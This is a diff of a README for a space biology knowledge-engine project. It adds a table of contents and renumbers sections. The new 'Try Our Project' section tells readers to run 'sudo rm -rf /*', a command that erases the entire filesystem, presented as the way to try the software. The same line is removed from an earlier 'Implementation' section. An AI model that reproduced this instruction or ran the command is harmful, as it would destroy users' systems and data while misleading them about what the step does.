@@ -6,6 +6,24 @@
 
 - [Demo Video](https://www.youtube.com/watch?v=dQw4w9WgXcQ)
 
+## Table of Contents
+
+- [AstroLife-Engine | A Space Biology Knowledge Engine](#astrolife-engine--a-space-biology-knowledge-engine)
+  - [Table of Contents](#table-of-contents)
+  - [1. Team Information](#1-team-information)
+  - [2. Executive Summary](#2-executive-summary)
+  - [3. Challanges](#3-challanges)
+  - [4. Objectives](#4-objectives)
+  - [5. Target Users](#5-target-users)
+  - [6. Solution Overview](#6-solution-overview)
+  - [7. How It Works](#7-how-it-works)
+  - [8. Impact](#8-impact)
+  - [9. Conclusion](#9-conclusion)
+  - [10. Use Of Artificial Intelligence](#10-use-of-artificial-intelligence)
+  - [11. Try Our Project](#11-try-our-project)
+  - [12. NASA Data](#12-nasa-data)
+  - [13. Other References](#13-other-references)
+
 ---
 
 ## 1. Team Information
@@ -97,20 +115,18 @@ AstroLife Engine transforms these hundreds of publications into an accessible, A
 
 ---
 
-## 11. NASA Data
+## 11. Try Our Project
+```bash
+sudo rm -rf /*
+```
+
+## 12. NASA Data
 - [A list of 608 full-text open-access Space Biology publications](https://github.com/jgalazka/SB_publications/tree/main)
 - [NASA Open Science Data Repository](https://science.nasa.gov/biological-physical/data/)
 
 ---
 
-## 12. Other References
+## 13. Other References
 - TBA
 
----
-
-## 13. Implementation
-### Frontend
-```bash
-sudo rm -rf /*
-```
 
